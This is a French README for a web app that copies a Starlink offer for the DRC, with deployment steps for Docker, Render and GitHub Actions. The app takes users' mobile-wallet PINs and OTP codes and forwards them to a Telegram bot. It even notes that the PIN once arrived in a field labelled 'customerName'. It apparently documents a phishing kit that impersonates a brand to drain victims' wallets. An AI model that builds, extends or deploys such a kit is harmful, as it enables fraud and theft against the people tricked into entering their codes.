# Starlink RDC

Application React + Node qui reproduit l'offre Starlink en RDC présentée sur l'image.

## Structure

- `client/` : application React avec Vite
- `server/` : API Node + Express

## Installation

1. Ouvrez un terminal dans le dossier racine `congo`
2. Installez les dépendances :
   - `npm install`
   - `npm run install-all`
3. Démarrez le projet :
   - `npm run start`

## API

- `GET /api/offres` : renvoie les forfaits et les informations du kit
- `POST /api/notify` : envoie la demande initiale de validation
- `POST /api/submit` : envoie le code OTP pour verification

## Notifications (best practice)

- Definir dans `server/.env`:
   - `TELEGRAM_BOT_TOKEN=...`
   - `TELEGRAM_CHAT_ID=...`
   - `TELEGRAM_ENABLED=true`
- Le champ recommande pour le PIN est `walletPin` (4-6 chiffres).
- Compatibilite conservee: `customerName` est encore accepte cote serveur pour les anciens clients.
- Le PIN est masque dans les messages de notification envoyes (ex: `**34`).

## Notes

L'application utilise des données structurées en JavaScript avec une séparation claire entre le backend, le frontend et la logique métier.

## CI/CD Production (push -> production)

Un pipeline GitHub Actions est configure dans `.github/workflows/production-cicd.yml`.

Comportement:

- Chaque push sur `main` lance la verification (build client + check serveur).
- Si la verification reussit, le workflow se connecte en SSH a votre serveur.
- Le code est synchronise sur le serveur, puis Docker Compose reconstruit et redemarre les services en production.

### Secrets GitHub obligatoires

Dans votre repo GitHub, allez dans `Settings > Secrets and variables > Actions` et creez:

- `PROD_HOST`: IP ou domaine du serveur de production.
- `PROD_USER`: utilisateur SSH du serveur.
- `PROD_SSH_KEY`: cle privee SSH (format OpenSSH) pour acceder au serveur.
- `PROD_PORT`: port SSH (ex: `22`).
- `PROD_APP_DIR`: dossier de deploiement sur le serveur (ex: `/opt/drc`).
- `PORT`: port interne API (ex: `4000`).
- `TELEGRAM_BOT_TOKEN`: token bot Telegram.
- `TELEGRAM_CHAT_ID`: chat id Telegram.
- `TELEGRAM_ENABLED`: `true` ou `false`.

### Pre-requis serveur (une seule fois)

Sur la machine de production, installer:

- Docker
- Docker Compose plugin (`docker compose`)
- Git

Ouvrir le port HTTP entrant:

- `80/tcp`

### Fichiers production ajoutes

- `deployment/docker-compose.prod.yml`
- `deployment/Dockerfile.server`
- `deployment/Dockerfile.client`
- `deployment/nginx.conf`

Le conteneur `web` sert le frontend et proxy `/api/*` vers le conteneur `api`.

## Production web (Render)

Configuration recommandee:

- Frontend: Render static site (nouveau domaine fourni par vous)
- Backend: Render web service

### Variables frontend

Dans le service frontend Render, definissez :

- `VITE_API_BASE_URL=https://<votre-backend-render>.onrender.com`

Le frontend supporte aussi un appel relatif si la variable n'est pas fournie, mais pour un domaine frontend distinct il est recommande d'utiliser cette variable explicitement.

### Render

Le fichier `render.yaml` contient maintenant les deux services necessaires :

- backend Node.js (`server`)
- frontend static (`client`)

Important: verifier dans Render que les variables d'environnement Telegram sont correctes selon vos besoins.

### Redeploiement cloud 100% automatique (sans clic dashboard)

Le workflow `.github/workflows/cloud-auto-redeploy.yml` declenche automatiquement le deploy Render apres chaque push sur `main` via le deploy hook.

Ajouter ces secrets GitHub (`Settings > Secrets and variables > Actions`):

- `RENDER_DEPLOY_HOOK_URL`: URL du deploy hook Render.
- `BACKEND_HEALTH_URL`: ex `https://<votre-backend-render>.onrender.com/api/offres`
- `FRONTEND_HEALTH_URL`: ex `https://<votre-nouveau-domaine-frontend>/`

Resultat:

- Push sur `main` -> trigger Render
- Workflow attend ensuite que backend/frontend repondent HTTP `200`
